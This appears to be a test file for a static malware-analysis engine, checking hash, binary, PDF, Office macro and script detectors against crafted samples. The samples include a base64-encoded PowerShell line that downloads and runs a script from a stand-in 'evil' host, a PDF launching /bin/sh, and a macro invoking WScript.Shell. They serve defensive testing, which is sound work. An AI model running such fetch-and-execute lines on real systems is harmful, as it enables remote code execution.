"""Hermetic tests for av_static.py — the static malware-analysis engines. Everything here runs
with only the standard library (no yara/oletools/lief/ssdeep): the stdlib engines are exercised
with crafted inputs, and the optional-lib paths just have to degrade gracefully.

Run: python test_av_static.py
"""
import base64
import hashlib
import os
import struct
import tempfile
import zipfile

import av_static as av


# ---- hashing --------------------------------------------------------------

def test_multi_hash_matches_hashlib():
    data = b"hello ember" * 100
    p = _tmp(data)
    h = av.multi_hash(p)
    assert h["ok"]
    assert h["md5"] == hashlib.md5(data).hexdigest()
    assert h["sha1"] == hashlib.sha1(data).hexdigest()
    assert h["sha256"] == hashlib.sha256(data).hexdigest()
    assert h["size"] == len(data)


def test_fuzzy_similarity():
    a = av.fuzzy_hash(b"A" * 2000 + b"the quick brown fox " * 50)
    b = av.fuzzy_hash(b"A" * 2000 + b"the quick brown fox " * 50 + b"tail")
    c = av.fuzzy_hash(os.urandom(0) + b"completely different content " * 80)
    assert av.fuzzy_similar(a, b) > 0.5      # near-identical files score high
    assert av.fuzzy_similar(a, c) < 0.3      # unrelated files score low
    assert av.fuzzy_similar("", "x") == 0.0


def test_fuzzy_hash_file_degrades_to_ctph():
    p = _tmp(b"payload bytes " * 200)
    r = av.fuzzy_hash_file(p)
    assert r["engine"] in ("ctph", "ssdeep") and r["hash"]


# ---- PE / ELF / Mach-O parsing -------------------------------------------

def _make_packed_pe() -> bytes:
    buf = bytearray(0xA00)
    buf[0:2] = b"MZ"
    struct.pack_into("<I", buf, 0x3C, 0x80)               # e_lfanew
    buf[0x80:0x84] = b"PE\x00\x00"
    struct.pack_into("<HHIIIHH", buf, 0x84, 0x8664, 1, 0, 0, 0, 0xF0, 0x22)  # COFF
    struct.pack_into("<H", buf, 0x98, 0x20B)              # optional magic PE32+
    # import data directory (index 1) left zero -> "no imports"
    struct.pack_into("<8sIIIIIIHHI", buf, 0x188,
                     b"UPX0", 0x800, 0x1000, 0x800, 0x200, 0, 0, 0, 0, 0xA0000000)  # W^X packer sect
    buf[0x200:0xA00] = bytes(range(256)) * 8              # 2 KB, entropy 8.0 (>1024 triggers flag)
    return bytes(buf)


def test_parse_pe_flags_packer_wx_entropy_and_no_imports():
    r = av.parse_binary(_make_packed_pe())
    assert r["format"] == "pe"
    joined = " ".join(r["suspicious"]).lower()
    assert "upx" in joined                    # packer section name
    assert "w^x" in joined or "writable and executable" in joined
    assert "high-entropy" in joined
    assert "no import table" in joined
    assert r["has_imports"] is False


def test_parse_elf_and_macho_magic():
    elf = b"\x7fELF\x02\x01" + b"\x00" * 10 + struct.pack("<HH", 2, 0x3E) + b"\x00" * 200
    r = av.parse_binary(elf)
    assert r["format"] == "elf" and r["bits"] == 64 and r["e_type"] == "EXEC"

    macho = b"\xcf\xfa\xed\xfe" + b"\x00" * 60
    rm = av.parse_binary(macho)
    assert rm["format"] == "macho" and rm["bits"] == 64


def test_parse_unknown():
    assert av.parse_binary(b"not a binary")["format"] == "unknown"


# ---- PDF ------------------------------------------------------------------

def test_analyze_pdf_flags_js_and_openaction():
    pdf = b"%PDF-1.5\n1 0 obj<< /OpenAction << /S /JavaScript /JS (evil()) >> >>\nendobj\ntrailer"
    r = av.analyze_pdf(pdf)
    assert "/JavaScript" in r["indicators"] or "/JS" in r["indicators"]
    assert "/OpenAction" in r["indicators"]
    assert r["verdict"] in ("suspicious", "malicious")


def test_analyze_pdf_launch_is_malicious():
    r = av.analyze_pdf(b"%PDF-1.4 /OpenAction /Launch (/bin/sh)")
    assert r["verdict"] == "malicious"


def test_clean_pdf():
    assert av.analyze_pdf(b"%PDF-1.4 just text objects")["verdict"] == "clean"


# ---- Office VBA macros ----------------------------------------------------

def test_office_macro_maldoc_detected():
    p = _tmp(b"", suffix=".xlsm")
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("xl/vbaProject.bin",
                   b"...AutoOpen...CreateObject...WScript.Shell...powershell -enc ...")
    r = av.analyze_office_macros(p)
    assert r["has_macros"] is True
    assert "AutoOpen" in r["autoexec"]
    assert any("Shell" in s or "powershell" in s for s in r["suspicious_apis"])
    assert r["verdict"] == "malicious"


def test_office_no_macros():
    p = _tmp(b"", suffix=".xlsx")
    with zipfile.ZipFile(p, "w") as z:
        z.writestr("xl/workbook.xml", "<workbook/>")
    assert av.analyze_office_macros(p)["has_macros"] is False


# ---- script de-obfuscation + AST -----------------------------------------

def test_analyze_script_decodes_base64_powershell():
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"
    enc = base64.b64encode(payload.encode("utf-16-le")).decode()
    r = av.analyze_script(f"powershell -enc {enc}", "ps")
    assert "iex" in r["iocs"] and "downloadstring" in r["iocs"]
    assert r["verdict"] == "malicious"


def test_analyze_script_python_ast():
    src = "import os\nx = 1\nexec(compile('print(1)', 'a', 'exec'))\nos.system('id')"
    r = av.analyze_script(src, "py")
    assert "exec" in r["ast_findings"] and "compile" in r["ast_findings"]
    assert "os.system" in r["ast_findings"]


def test_benign_script_is_clean():
    r = av.analyze_script("def add(a, b):\n    return a + b\n", "py")
    assert r["verdict"] == "clean"


# ---- YARA degrades gracefully --------------------------------------------

def test_yara_absent_is_not_a_clean_verdict():
    r = av.yara_scan(_tmp(b"x"))
    assert r["available"] is False           # not installed / no rules -> engine unavailable
    assert "verdict" not in r                 # must NOT claim the file is clean


# ---- known-good cache -----------------------------------------------------

def test_known_good_cache_roundtrip():
    db = os.path.join(tempfile.mkdtemp(), "cache.db")
    c = av.KnownGoodCache(db)
    assert c.get("abc") is None
    c.put("abc", "clean", 10, 1.0)
    assert c.get("abc") == "clean"


# ---- integration entry point ---------------------------------------------

def test_contribute_routes_by_type():
    # PDF
    r = av.contribute("/x.pdf", b"%PDF-1.4 /OpenAction /JS (x)", ".pdf")
    assert r["verdict"] in ("suspicious", "malicious") and r["reasons"]
    # packed PE
    r2 = av.contribute("/x.exe", _make_packed_pe(), ".exe")
    assert r2["verdict"] == "suspicious" and r2["reasons"]
    # obfuscated script
    enc = base64.b64encode("IEX DownloadString".encode("utf-16-le")).decode()
    r3 = av.contribute("/x.ps1", f"powershell -enc {enc}".encode(), ".ps1")
    assert r3["reasons"]
    # benign text -> no extra signal
    r4 = av.contribute("/x.txt", b"just some notes", ".txt")
    assert r4["verdict"] == "clean" and not r4["reasons"]


def test_contribute_never_raises():
    # Garbage in every slot must not throw.
    for ext in (".pdf", ".docm", ".js", ".exe", ".txt", ""):
        av.contribute("/nope", b"\x00\x01\x02", ext)


# ---- helpers --------------------------------------------------------------

def _tmp(data: bytes, suffix: str = "") -> str:
    fd, p = tempfile.mkstemp(suffix=suffix)
    with os.fdopen(fd, "wb") as f:
        f.write(data)
    return p


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    passed = 0
    for t in tests:
        t()
        print(f"  ok  {t.__name__}")
        passed += 1
    print(f"\n{passed}/{len(tests)} av_static tests passed")
